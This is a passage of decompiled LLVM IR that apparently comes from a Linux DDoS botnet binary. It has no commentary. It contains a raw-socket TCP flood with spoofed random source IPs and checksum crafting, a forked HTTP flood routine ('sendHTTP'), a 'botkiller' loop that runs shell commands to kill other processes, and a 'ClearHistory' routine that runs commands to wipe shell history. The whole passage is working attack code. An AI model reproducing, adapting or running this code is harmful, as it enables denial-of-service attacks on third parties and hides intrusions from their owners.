  br i1 %v2_fbb0, label %dec_label_pc_fbb8, label %dec_label_pc_fbd0

dec_label_pc_fbb8:                                ; preds = %entry
  %v0_fbb8 = call i32 @rand_cmwc()
  br label %dec_label_pc_fbec

dec_label_pc_fbd0:                                ; preds = %entry
  %v3_fbd8 = urem i32 %arg2, 65536
  %v1_fbe0 = call i32 @__GI_htons(i32 %v3_fbd8)
  br label %dec_label_pc_fbec

dec_label_pc_fbec:                                ; preds = %dec_label_pc_fbb8, %dec_label_pc_fbd0
  %v3_fbfc = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_fc04 = icmp eq i32 %v3_fbfc, 0
  br i1 %v2_fc04, label %dec_label_pc_fc10, label %dec_label_pc_1024c

dec_label_pc_fc10:                                ; preds = %dec_label_pc_fbec
  store i32 8, i32* @r2, align 4
  %v2_fc24 = bitcast i32* %stack_var_-60 to i8*
  %v3_fc24 = call i32 @__GI_memset(i8* %v2_fc24, i32 0)
  store i32 6, i32* @r2, align 4
  %v3_fc34 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_fc44 = icmp eq i32 %v3_fc34, 0
  br i1 %v2_fc44, label %dec_label_pc_fc4c, label %dec_label_pc_fc64

dec_label_pc_fc4c:                                ; preds = %dec_label_pc_fc10
  %v2_fc50 = load i32, i32* @global_var_2a530.50, align 4
  %v3_fc5c = call i32 @sockprintf(i32 %v2_fc50, i32 ptrtoint ([27 x i8]* @global_var_1fcf8.563 to i32))
  br label %dec_label_pc_1024c

dec_label_pc_fc64:                                ; preds = %dec_label_pc_fc10
  store i32 1, i32* %stack_var_-72, align 4
  %v2_fc6c = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* @r2, align 4
  %v5_fc88 = call i32 @__GI_setsockopt(i32 %v3_fc34, i32 0, i32 3, i32 %v2_fc6c, i32 4)
  %v1_fc90 = icmp slt i32 %v5_fc88, 0
  br i1 %v1_fc90, label %dec_label_pc_fc98, label %dec_label_pc_fcb0

dec_label_pc_fc98:                                ; preds = %dec_label_pc_fc64
  %v2_fc9c = load i32, i32* @global_var_2a530.50, align 4
  %v3_fca8 = call i32 @sockprintf(i32 %v2_fc9c, i32 ptrtoint ([33 x i8]* @global_var_1fd14.565 to i32))
  br label %dec_label_pc_1024c

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fc64
  %v2_fcb4 = icmp eq i32 %arg4, 0
  br i1 %v2_fcb4, label %dec_label_pc_fce0, label %dec_label_pc_fcc8

dec_label_pc_fcc8:                                ; preds = %dec_label_pc_fcb0
  %v1_fccc = sub i32 32, %arg4
  store i32 %v1_fccc, i32* %r2.global-to-local, align 4
  %v1_fcd8 = shl i32 -1, %v1_fccc
  br label %dec_label_pc_fce0

dec_label_pc_fce0:                                ; preds = %dec_label_pc_fcb0, %dec_label_pc_fcc8
  %storemerge9 = phi i32 [ %v1_fcd8, %dec_label_pc_fcc8 ], [ 0, %dec_label_pc_fcb0 ]
  %v1_fce4 = add i32 %arg6, 40
  %v1_fcf4 = add i32 %arg6, 54
  %v3_fcf8 = and i32 %v1_fcf4, -8
  %v1_fd00 = load i32, i32* @sp, align 4
  %v2_fd00 = sub i32 %v1_fd00, %v3_fcf8
  %v1_fd10 = add i32 %v2_fd00, 15
  %v3_fd14 = and i32 %v1_fd10, -8
  store i32 %v3_fd14, i32* %r2.global-to-local, align 4
  %v1_fd34 = add i32 %v3_fd14, 20
  %v5_fd38 = inttoptr i32 %v1_fd34 to i16*
  %v3_fd3c = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_fd3c, i32* @r4, align 4
  %v1_fd44 = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_fd50 = call i32 @__GI_htonl(i32 %v1_fd44)
  store i32 %v1_fd50, i32* %r2.global-to-local, align 4
  %v1_fd5c = add i32 %arg6, 20
  %v1_fd60 = load i32, i32* @sp, align 4
  %v2_fd60 = inttoptr i32 %v1_fd60 to i32*
  store i32 %v1_fd5c, i32* %v2_fd60, align 4
  %v0_fd68 = load i32, i32* @r4, align 4
  %v4_fd70 = inttoptr i32 %v3_fd14 to i8*
  %v5_fd70 = call i32 @makeIPPacket(i8* %v4_fd70, i32 %v0_fd68, i32 %v1_fd50, i32 6)
  %v0_fd74 = call i32 @rand_cmwc()
  %v3_fd80 = urem i32 %v0_fd74, 65536
  store i32 %v3_fd80, i32* %r2.global-to-local, align 4
  %v1_fd88 = trunc i32 %v0_fd74 to i16
  store i16 %v1_fd88, i16* %v5_fd38, align 4
  %v0_fd8c = call i32 @rand_cmwc()
  %v2_fd98 = add i32 %v3_fd14, 24
  %v3_fd98 = inttoptr i32 %v2_fd98 to i32*
  store i32 %v0_fd8c, i32* %v3_fd98, align 8
  %v2_fda4 = add i32 %v3_fd14, 28
  %v3_fda4 = inttoptr i32 %v2_fda4 to i32*
  store i32 0, i32* %v3_fda4, align 4
  store i32 %v1_fd34, i32* %r2.global-to-local, align 4
  %v1_fdac = add i32 %v3_fd14, 32
  %v2_fdac = inttoptr i32 %v1_fdac to i8*
  %v3_fdac = load i8, i8* %v2_fdac, align 8
  %v1_fdb8 = urem i8 %v3_fdac, 16
  %v1_fdbc = or i8 %v1_fdb8, 80
  store i8 %v1_fdbc, i8* %v2_fdac, align 8
  %v3_fdcc = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1fd38.570 to i32), i32* @r1, align 4
  %v3_fdd8 = inttoptr i32 %v3_fdcc to i8*
  %v4_fdd8 = call i32 @__GI_strcoll(i8* %v3_fdd8, i32 ptrtoint ([4 x i8]* @global_var_1fd38.570 to i32))
  %v2_fde0 = icmp eq i32 %v4_fdd8, 0
  br i1 %v2_fde0, label %dec_label_pc_fde8, label %dec_label_pc_fea0

dec_label_pc_fde8:                                ; preds = %dec_label_pc_fce0
  store i32 %v1_fd34, i32* %r2.global-to-local, align 4
  %v1_fdec = add i32 %v3_fd14, 33
  %v2_fdec = inttoptr i32 %v1_fdec to i8*
  %v3_fdec = load i8, i8* %v2_fdec, align 1
  %v1_fdfc = or i8 %v3_fdec, 2
  store i8 %v1_fdfc, i8* %v2_fdec, align 1
  store i32 %v1_fd34, i32* %r2.global-to-local, align 4
  %v3_fe10 = load i8, i8* %v2_fdec, align 1
  %v1_fe20 = or i8 %v3_fe10, 4
  store i8 %v1_fe20, i8* %v2_fdec, align 1
  store i32 %v1_fd34, i32* %r2.global-to-local, align 4
  %v3_fe34 = load i8, i8* %v2_fdec, align 1
  %v1_fe44 = or i8 %v3_fe34, 1
  store i8 %v1_fe44, i8* %v2_fdec, align 1
  store i32 %v1_fd34, i32* %r2.global-to-local, align 4
  %v3_fe58 = load i8, i8* %v2_fdec, align 1
  %v1_fe68 = or i8 %v3_fe58, 16
  store i8 %v1_fe68, i8* %v2_fdec, align 1
  store i32 %v1_fd34, i32* %r2.global-to-local, align 4
  %v3_fe7c = load i8, i8* %v2_fdec, align 1
  %v1_fe8c = or i8 %v3_fe7c, 8
  store i8 %v1_fe8c, i8* %v2_fdec, align 1
  br label %dec_label_pc_10048

dec_label_pc_fea0:                                ; preds = %dec_label_pc_fce0
  %v3_fea0 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_feac = call i32 @__GI_strtok(i32 %v3_fea0, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  %v2_1004018 = icmp eq i32 %v2_feac, 0
  br i1 %v2_1004018, label %dec_label_pc_10048, label %dec_label_pc_febc.lr.ph

dec_label_pc_febc.lr.ph:                          ; preds = %dec_label_pc_fea0
  %v1_fedc = add i32 %v3_fd14, 33
  %v2_fedc = inttoptr i32 %v1_fedc to i8*
  br label %dec_label_pc_febc

dec_label_pc_febc:                                ; preds = %dec_label_pc_febc.lr.ph, %dec_label_pc_10028
  %storemerge1319 = phi i32 [ %v2_feac, %dec_label_pc_febc.lr.ph ], [ %v2_10030, %dec_label_pc_10028 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1fd40.574 to i32), i32* @r1, align 4
  %v3_fec8 = inttoptr i32 %storemerge1319 to i8*
  %v4_fec8 = call i32 @__GI_strcoll(i8* %v3_fec8, i32 ptrtoint ([4 x i8]* @global_var_1fd40.574 to i32))
  %v2_fed0 = icmp eq i32 %v4_fec8, 0
  br i1 %v2_fed0, label %dec_label_pc_fed8, label %dec_label_pc_ff00

dec_label_pc_fed8:                                ; preds = %dec_label_pc_febc
  %v3_fedc = load i8, i8* %v2_fedc, align 1
  %v4_fee4 = zext i8 %v3_fedc to i32
  %v1_feec = or i32 %v4_fee4, 2
  store i32 %v1_feec, i32* %r2.global-to-local, align 4
  %v1_fef8 = trunc i32 %v1_feec to i8
  store i8 %v1_fef8, i8* %v2_fedc, align 1
  br label %dec_label_pc_10028

dec_label_pc_ff00:                                ; preds = %dec_label_pc_febc
  store i32 ptrtoint ([4 x i8]* @global_var_1fd44.576 to i32), i32* @r1, align 4
  %v4_ff0c = call i32 @__GI_strcoll(i8* %v3_fec8, i32 ptrtoint ([4 x i8]* @global_var_1fd44.576 to i32))
  %v2_ff14 = icmp eq i32 %v4_ff0c, 0
  br i1 %v2_ff14, label %dec_label_pc_ff1c, label %dec_label_pc_ff44

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_ff00
  %v3_ff20 = load i8, i8* %v2_fedc, align 1
  %v4_ff28 = zext i8 %v3_ff20 to i32
  %v1_ff30 = or i32 %v4_ff28, 4
  store i32 %v1_ff30, i32* %r2.global-to-local, align 4
  %v1_ff3c = trunc i32 %v1_ff30 to i8
  store i8 %v1_ff3c, i8* %v2_fedc, align 1
  br label %dec_label_pc_10028

dec_label_pc_ff44:                                ; preds = %dec_label_pc_ff00
  store i32 ptrtoint ([4 x i8]* @global_var_1fd48.578 to i32), i32* @r1, align 4
  %v4_ff50 = call i32 @__GI_strcoll(i8* %v3_fec8, i32 ptrtoint ([4 x i8]* @global_var_1fd48.578 to i32))
  %v2_ff58 = icmp eq i32 %v4_ff50, 0
  br i1 %v2_ff58, label %dec_label_pc_ff60, label %dec_label_pc_ff88

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff44
  %v3_ff64 = load i8, i8* %v2_fedc, align 1
  %v4_ff6c = zext i8 %v3_ff64 to i32
  %v1_ff74 = or i32 %v4_ff6c, 1
  store i32 %v1_ff74, i32* %r2.global-to-local, align 4
  %v1_ff80 = trunc i32 %v1_ff74 to i8
  store i8 %v1_ff80, i8* %v2_fedc, align 1
  br label %dec_label_pc_10028

dec_label_pc_ff88:                                ; preds = %dec_label_pc_ff44
  store i32 ptrtoint ([4 x i8]* @global_var_1fd4c.580 to i32), i32* @r1, align 4
  %v4_ff94 = call i32 @__GI_strcoll(i8* %v3_fec8, i32 ptrtoint ([4 x i8]* @global_var_1fd4c.580 to i32))
  %v2_ff9c = icmp eq i32 %v4_ff94, 0
  br i1 %v2_ff9c, label %dec_label_pc_ffa4, label %dec_label_pc_ffcc

dec_label_pc_ffa4:                                ; preds = %dec_label_pc_ff88
  %v3_ffa8 = load i8, i8* %v2_fedc, align 1
  %v4_ffb0 = zext i8 %v3_ffa8 to i32
  %v1_ffb8 = or i32 %v4_ffb0, 16
  store i32 %v1_ffb8, i32* %r2.global-to-local, align 4
  %v1_ffc4 = trunc i32 %v1_ffb8 to i8
  store i8 %v1_ffc4, i8* %v2_fedc, align 1
  br label %dec_label_pc_10028

dec_label_pc_ffcc:                                ; preds = %dec_label_pc_ff88
  store i32 ptrtoint ([4 x i8]* @global_var_1fd50.582 to i32), i32* @r1, align 4
  %v4_ffd8 = call i32 @__GI_strcoll(i8* %v3_fec8, i32 ptrtoint ([4 x i8]* @global_var_1fd50.582 to i32))
  %v2_ffe0 = icmp eq i32 %v4_ffd8, 0
  br i1 %v2_ffe0, label %dec_label_pc_ffe8, label %dec_label_pc_10010

dec_label_pc_ffe8:                                ; preds = %dec_label_pc_ffcc
  %v3_ffec = load i8, i8* %v2_fedc, align 1
  %v4_fff4 = zext i8 %v3_ffec to i32
  %v1_fffc = or i32 %v4_fff4, 8
  store i32 %v1_fffc, i32* %r2.global-to-local, align 4
  %v1_10008 = trunc i32 %v1_fffc to i8
  store i8 %v1_10008, i8* %v2_fedc, align 1
  br label %dec_label_pc_10028

dec_label_pc_10010:                               ; preds = %dec_label_pc_ffcc
  %v2_10014 = load i32, i32* @global_var_2a530.50, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_10024 = call i32 @sockprintf(i32 %v2_10014, i32 ptrtoint ([18 x i8]* @global_var_1fd54.584 to i32))
  br label %dec_label_pc_10028

dec_label_pc_10028:                               ; preds = %dec_label_pc_ffe8, %dec_label_pc_ffa4, %dec_label_pc_ff60, %dec_label_pc_ff1c, %dec_label_pc_fed8, %dec_label_pc_10010
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_10030 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  %v2_10040 = icmp eq i32 %v2_10030, 0
  br i1 %v2_10040, label %dec_label_pc_10048, label %dec_label_pc_febc

dec_label_pc_10048:                               ; preds = %dec_label_pc_10028, %dec_label_pc_fea0, %dec_label_pc_fde8
  %v0_10048 = call i32 @rand_cmwc()
  %v1_1005c = trunc i32 %v0_10048 to i16
  %v3_1005c = add i32 %v3_fd14, 34
  %v4_1005c = inttoptr i32 %v3_1005c to i16*
  store i16 %v1_1005c, i16* %v4_1005c, align 2
  %v3_10068 = add i32 %v3_fd14, 36
  %v4_10068 = inttoptr i32 %v3_10068 to i16*
  store i16 0, i16* %v4_10068, align 4
  store i32 %v1_fd34, i32* %r2.global-to-local, align 4
  %v3_10074 = add i32 %v3_fd14, 38
  %v4_10074 = inttoptr i32 %v3_10074 to i16*
  store i16 0, i16* %v4_10074, align 2
  br i1 %v2_fbb0, label %dec_label_pc_10084, label %dec_label_pc_1009c

dec_label_pc_10084:                               ; preds = %dec_label_pc_10048
  %v0_10084 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_10084 to i16
  br label %dec_label_pc_100b8

dec_label_pc_1009c:                               ; preds = %dec_label_pc_10048
  %v3_100a4 = urem i32 %arg2, 65536
  %v1_100ac = call i32 @__GI_htons(i32 %v3_100a4)
  %extract.t72 = trunc i32 %v1_100ac to i16
  br label %dec_label_pc_100b8

dec_label_pc_100b8:                               ; preds = %dec_label_pc_10084, %dec_label_pc_1009c
  %v0_10084.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10084 ], [ %extract.t72, %dec_label_pc_1009c ]
  %v3_100c0 = add i32 %v3_fd14, 22
  %v4_100c0 = inttoptr i32 %v3_100c0 to i16*
  store i16 %v0_10084.sink.off0, i16* %v4_100c0, align 2
  %v2_100cc = call i32 @tcpcsum(i32 %v3_fd14, i32 %v1_fd34)
  %v1_100dc = trunc i32 %v2_100cc to i16
  store i16 %v1_100dc, i16* %v4_10068, align 4
  store i32 %v3_fd14, i32* %r2.global-to-local, align 4
  %v1_100ec = or i32 %v3_fd14, 2
  %v2_100ec = inttoptr i32 %v1_100ec to i16*
  %v3_100ec = load i16, i16* %v2_100ec, align 2
  %v4_100ec = zext i16 %v3_100ec to i32
  %v2_100f8 = inttoptr i32 %v3_fd14 to i16*
  %v3_100f8 = call i32 @csum(i16* %v2_100f8, i32 %v4_100ec)
  %sext3 = mul i32 %v3_100f8, 65536
  %v1_100fc = sdiv i32 %sext3, 65536
  store i32 %v1_100fc, i32* %r2.global-to-local, align 4
  %v1_10108 = trunc i32 %v1_100fc to i16
  %v3_10108 = add i32 %v3_fd14, 10
  %v4_10108 = inttoptr i32 %v3_10108 to i16*
  store i16 %v1_10108, i16* %v4_10108, align 2
  %v2_10110 = call i32 @__GI_time(i32* null)
  %v2_1011c = add i32 %v2_10110, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10130 = ptrtoint i32* %stack_var_-68 to i32
  %v2_10170 = add i32 %v3_fd14, 12
  %v3_10170 = inttoptr i32 %v2_10170 to i32*
  %v3_10188 = or i32 %v3_fd14, 4
  %v4_10188 = inttoptr i32 %v3_10188 to i16*
  br label %dec_label_pc_1012c

dec_label_pc_1012c:                               ; preds = %dec_label_pc_1023c, %dec_label_pc_10230, %dec_label_pc_100b8
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_100b8 ], [ 0, %dec_label_pc_10230 ], [ %v1_10240, %dec_label_pc_1023c ]
  store i32 %v3_fd14, i32* %r2.global-to-local, align 4
  %v1_10134 = load i32, i32* @sp, align 4
  %v2_10134 = inttoptr i32 %v1_10134 to i32*
  store i32 %v2_10130, i32* %v2_10134, align 4
  %v1_1013c = load i32, i32* @sp, align 4
  %v2_1013c = add i32 %v1_1013c, 4
  %v3_1013c = inttoptr i32 %v2_1013c to i32*
  store i32 16, i32* %v3_1013c, align 4
  %v0_10144 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_fce4, i32* %r2.global-to-local, align 4
  %v6_10150 = call i32 @__libc_sendto(i32 %v3_fc34, i32 %v0_10144, i32 %v1_fce4, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10158 = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_10164 = call i32 @__GI_htonl(i32 %v1_10158)
  store i32 %v1_10164, i32* %r2.global-to-local, align 4
  store i32 %v1_10164, i32* %v3_10170, align 4
  %v0_10174 = call i32 @rand_cmwc()
  %v3_10180 = urem i32 %v0_10174, 65536
  store i32 %v3_10180, i32* %r2.global-to-local, align 4
  %v1_10188 = trunc i32 %v0_10174 to i16
  store i16 %v1_10188, i16* %v4_10188, align 4
  %v0_1018c = call i32 @rand_cmwc()
  store i32 %v0_1018c, i32* %r2.global-to-local, align 4
  store i32 %v0_1018c, i32* %v3_fd98, align 8
  %v0_1019c = call i32 @rand_cmwc()
  %v1_101b0 = trunc i32 %v0_1019c to i16
  store i16 %v1_101b0, i16* %v5_fd38, align 4
  store i32 %v1_fd34, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_10068, align 4
  %v4_101c8 = call i32 @tcpcsum(i32 %v3_fd14, i32 %v1_fd34)
  %v1_101d8 = trunc i32 %v4_101c8 to i16
  store i16 %v1_101d8, i16* %v4_10068, align 4
  store i32 %v3_fd14, i32* %r2.global-to-local, align 4
  %v3_101e8 = load i16, i16* %v2_100ec, align 2
  %v4_101e8 = zext i16 %v3_101e8 to i32
  %v3_101f4 = call i32 @csum(i16* %v2_100f8, i32 %v4_101e8)
  %sext5 = mul i32 %v3_101f4, 65536
  %v1_101f8 = sdiv i32 %sext5, 65536
  store i32 %v1_101f8, i32* %r2.global-to-local, align 4
  %v1_10204 = trunc i32 %v1_101f8 to i16
  store i16 %v1_10204, i16* %v4_10108, align 2
  %v9_10210 = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_10210, label %dec_label_pc_10218, label %dec_label_pc_1023c

dec_label_pc_10218:                               ; preds = %dec_label_pc_1012c
  %v2_1021c = call i32 @__GI_time(i32* null)
  store i32 %v2_1021c, i32* %r2.global-to-local, align 4
  %v8_1022c = icmp sgt i32 %v2_1021c, %v2_1011c
  br i1 %v8_1022c, label %dec_label_pc_1024c, label %dec_label_pc_10230

dec_label_pc_10230:                               ; preds = %dec_label_pc_10218
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1012c

dec_label_pc_1023c:                               ; preds = %dec_label_pc_1012c
  %v1_10240 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_1012c

dec_label_pc_1024c:                               ; preds = %dec_label_pc_10218, %dec_label_pc_fbec, %dec_label_pc_fc98, %dec_label_pc_fc4c
  %v1_10258 = phi i32 [ %v3_fbfc, %dec_label_pc_fbec ], [ %v3_fca8, %dec_label_pc_fc98 ], [ %v3_fc5c, %dec_label_pc_fc4c ], [ %v2_1021c, %dec_label_pc_10218 ]
  ret i32 %v1_10258

; uselistorder directives
  uselistorder i32 %v1_101f8, { 1, 0 }
  uselistorder i32 %v0_10174, { 1, 0 }
  uselistorder i32 %v1_100fc, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_fedc, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_fdec, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_fd74, { 1, 0 }
  uselistorder i32 %v1_fd34, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_fd14, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_fce4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1024c, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100b8, { 1, 0 }
  uselistorder label %dec_label_pc_10028, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_febc, { 1, 0 }
  uselistorder label %dec_label_pc_fce0, { 1, 0 }
  uselistorder label %dec_label_pc_fbec, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_10288 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10288, i32* @ip, align 4
  %v2_102a4 = ptrtoint i32* %stack_var_-100 to i32
  %v2_102d0 = bitcast i32* %stack_var_-100 to i8*
  br label %dec_label_pc_10298

dec_label_pc_10298:                               ; preds = %dec_label_pc_10344, %entry
  br label %dec_label_pc_102a4

dec_label_pc_102a4:                               ; preds = %dec_label_pc_10298, %dec_label_pc_102a4
  %storemerge12 = phi i32 [ 0, %dec_label_pc_10298 ], [ %v1_10330, %dec_label_pc_102a4 ]
  store i32 %v2_102a4, i32* @r3, align 4
  store i32 %v2_102a4, i32* @r0, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1fd68.586 to i32), i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_102b4 = call i32 @memcpy()
  %v4_102c0 = mul nuw nsw i32 %storemerge12, 4
  %v5_102c0 = add i32 %v4_102c0, ptrtoint ([87 x i8*]* @global_var_2a090.671 to i32)
  %v6_102c0 = inttoptr i32 %v5_102c0 to i32*
  %v7_102c0 = load i32, i32* %v6_102c0, align 4
  store i32 %v7_102c0, i32* @r1, align 4
  %v3_102d0 = call i32 @strcat(i8* %v2_102d0, i32 %v7_102c0)
  %v1_102dc = call i32 @__libc_system(i32 %v2_102a4)
  store i32 %v2_102a4, i32* @r3, align 4
  store i32 %v2_102a4, i32* @r0, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1fd74.673 to i32), i32* @r1, align 4
  store i32 11, i32* @r2, align 4
  %v0_102f0 = call i32 @memcpy()
  %v7_102fc = load i32, i32* %v6_102c0, align 4
  store i32 %v7_102fc, i32* @r1, align 4
  %v3_1030c = call i32 @strcat(i8* %v2_102d0, i32 %v7_102fc)
  store i32 ptrtoint (i32* @global_var_1fd80.675 to i32), i32* @r1, align 4
  %v3_1031c = call i32 @strcat(i8* %v2_102d0, i32 ptrtoint (i32* @global_var_1fd80.675 to i32))
  %v1_10328 = call i32 @__libc_system(i32 %v2_102a4)
  %v1_10330 = add nuw nsw i32 %storemerge12, 1
  %v7_10340 = icmp slt i32 %v1_10330, 9
  br i1 %v7_10340, label %dec_label_pc_102a4, label %dec_label_pc_10344

dec_label_pc_10344:                               ; preds = %dec_label_pc_102a4
  %v1_10348 = call i32 @sleep(i32 5)
  br label %dec_label_pc_10298

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 51, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 49, { 0, 2, 1 }
  uselistorder [3 x i8]* @global_var_1e6a8.36, { 1, 0 }
  uselistorder label %dec_label_pc_102a4, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_10370 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1fd84.677 to i32))
  %v2_10378 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_1fd9c.679 to i32))
  %v2_10380 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1fdbc.681 to i32))
  ret i32 %v2_10380

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 4, 3, 2, 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-588 = alloca i32, align 4
  %stack_var_-48 = alloca i8**, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 66472, i32* %stack_var_-4, align 4
  %v2_103a4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_103a4, i32* @fp, align 4
  %v2_103c0 = ptrtoint i32* %stack_var_-24 to i32
  %v21_103d8 = ptrtoint i8*** %stack_var_-48 to i32
  store i32 %v21_103d8, i32* @lr, align 4
  store i8** bitcast ([32 x i8]* @global_var_1ff44.687 to i8**), i8*** %stack_var_-48, align 4
  %v2_103f8 = call i32 @__GI_time(i32* null)
  %v3_10400 = load i32, i32* %stack_var_0, align 4
  %v2_10404 = add i32 %v3_10400, %v2_103f8
  %v0_1040c = call i32 @rand()
  %v2_10420 = srem i32 %v0_1040c, 3
  %v3_10448 = mul nsw i32 %v2_10420, 4
  %v2_10450 = add i32 %v2_103c0, -52
  %v2_10454 = add i32 %v2_10450, %v3_10448
  %v1_10458 = inttoptr i32 %v2_10454 to i32*
  %v2_10458 = load i32, i32* %v1_10458, align 4
  store i32 %v2_10458, i32* @r4, align 4
  %v0_1045c = call i32 @rand()
  %v2_10490 = mul i32 %v0_1045c, -6
  %v3_104a0 = mul i32 %v0_1045c, -24
  %v2_104a8 = add i32 %v2_103c0, -40
  %v2_104ac = add i32 %v2_104a8, %v3_104a0
  %v1_104b0 = inttoptr i32 %v2_104ac to i32*
  %v2_104b0 = load i32, i32* %v1_104b0, align 4
  %v2_104b4 = ptrtoint i32* %stack_var_-588 to i32
  %v0_104b8 = load i32, i32* @r4, align 4
  store i32 %v2_104b4, i32* @r0, align 4
  %v8_104d0 = call i32 @sprintf(i32 %v2_104b4, i32 ptrtoint ([62 x i8]* @global_var_1fff0.707 to i32), i32 %arg2, i32 %arg4, i32 %v0_104b8, i32 %v2_104b0, i32 %v2_10490)
  store i32 %v8_104d0, i32* @r0, align 4
  %tmp36 = bitcast i32* %stack_var_-588 to i8*
  %v5_1058843 = icmp sgt i32 %arg6, 0
  br i1 %v5_1058843, label %dec_label_pc_104e0, label %dec_label_pc_1058c

dec_label_pc_104e0:                               ; preds = %entry, %dec_label_pc_10570
  %storemerge144 = phi i32 [ %v1_10574, %dec_label_pc_10570 ], [ 0, %entry ]
  %v0_104e0 = call i32 @__libc_fork()
  store i32 %v0_104e0, i32* @r0, align 4
  %v2_104e8 = icmp eq i32 %v0_104e0, 0
  br i1 %v2_104e8, label %dec_label_pc_10570, label %dec_label_pc_10550

dec_label_pc_104f4:                               ; preds = %dec_label_pc_10550
  %v4_10510 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v2_10520 = icmp eq i32 %v4_10510, 0
  br i1 %v2_10520, label %dec_label_pc_10550, label %dec_label_pc_10528

dec_label_pc_10528:                               ; preds = %dec_label_pc_104f4
  %v3_10530 = call i32 @strlen(i8* %tmp36)
  %v2_10544 = call i32 @__GI_write(i32 %v4_10510, i32 %v2_104b4)
  %v1_1054c = call i32 @__GI_close(i32 %v4_10510)
  br label %dec_label_pc_10550

dec_label_pc_10550:                               ; preds = %dec_label_pc_104f4, %dec_label_pc_10528, %dec_label_pc_104e0
  %v2_10554 = call i32 @__GI_time(i32* null)
  %v5_10564 = icmp slt i32 %v2_10554, %v2_10404
  br i1 %v5_10564, label %dec_label_pc_104f4, label %dec_label_pc_10568

dec_label_pc_10568:                               ; preds = %dec_label_pc_10550
  %v1_1056c = call i32 @__GI__exit(i32 1)
  store i32 %v1_1056c, i32* @r0, align 4
  br label %dec_label_pc_10570

dec_label_pc_10570:                               ; preds = %dec_label_pc_104e0, %dec_label_pc_10568
  %v1_105943 = phi i32 [ 0, %dec_label_pc_104e0 ], [ %v1_1056c, %dec_label_pc_10568 ]
